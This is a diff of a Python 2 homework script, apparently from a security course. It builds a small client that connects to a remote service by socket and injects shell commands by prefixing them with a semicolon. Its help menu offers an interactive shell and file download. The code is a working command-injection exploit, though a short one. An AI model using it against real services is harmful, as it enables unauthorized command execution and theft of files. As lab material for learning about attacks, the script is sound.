@@ -1,12 +1,3 @@
-"""
-Use the same techniques such as (but not limited to):
-1) Sockets
-2) File I/O
-3) raw_input()
-
-from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
 import time
 
@@ -18,22 +9,20 @@ def execute_cmd(cmd):
 	s.connect((host, port))
 
 	data = s.recv(1024)
-	time.sleep(4)
-	#print(data)
+	time.sleep(2)
 
 	s.send(";"+cmd+"\n")
 	data = s.recv(1024)
-	time.sleep(4)
+	time.sleep(2)
 
 	print(data)
 
 
 if __name__ == '__main__':
-	cd = ''
-	pwd = ''
+	cd = ''#stroe the current directory
 
 	while True:
-	#Process command from user input
+		#Process command from user input
 		input = raw_input('> ')
 		cmd = input.split()[0]
 
@@ -51,7 +40,10 @@ if __name__ == '__main__':
 		elif cmd == 'pull':
 			print('cmd is pull')
 		elif cmd == 'help':
-			print('show help menu')
+			print('shell                           ---Drop into an interactive shell and allow users to gracefully exit')
+			print('pull <remote-path> <local-path> ---Download files')
+			print('help                            ---Shows this help menu')
+			print('quit                            ---Quit the shell')
 		elif cmd == 'quit':
 			break
 		else:
